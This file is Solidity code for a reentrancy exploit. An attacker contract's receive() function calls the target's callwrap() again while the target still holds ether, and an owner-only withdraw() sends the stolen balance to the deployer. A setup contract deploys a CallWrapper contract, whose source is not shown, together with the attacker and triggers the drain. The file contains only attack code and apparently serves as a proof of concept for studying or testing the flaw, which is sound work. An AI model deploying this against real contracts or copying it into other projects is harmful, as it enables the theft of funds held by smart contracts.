interface ICallWrapper {
    function callwrap(address called) external;
}

contract ReentrancyAttack {
    ICallWrapper public target;
    address public owner;

    constructor(address _target) {
        target = ICallWrapper(_target);
        owner = msg.sender;
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.callwrap(address(this));
        }
    }

    function triggerAttack() external {
        require(msg.sender == owner, "Not authorized");
        target.callwrap(address(this));
    }

    function withdraw() external {
        require(msg.sender == owner, "Not authorized");
        payable(owner).transfer(address(this).balance);
    }
}

contract ExploitSetup {
    CallWrapper public vulnerable;
    ReentrancyAttack public attacker;

    constructor() payable {
        vulnerable = new CallWrapper();
        attacker = new ReentrancyAttack(address(vulnerable));
    }

    function executeExploit() external {
        vulnerable.callwrap(address(attacker));
    }

    function collectFunds() external {
        attacker.withdraw();
    }
}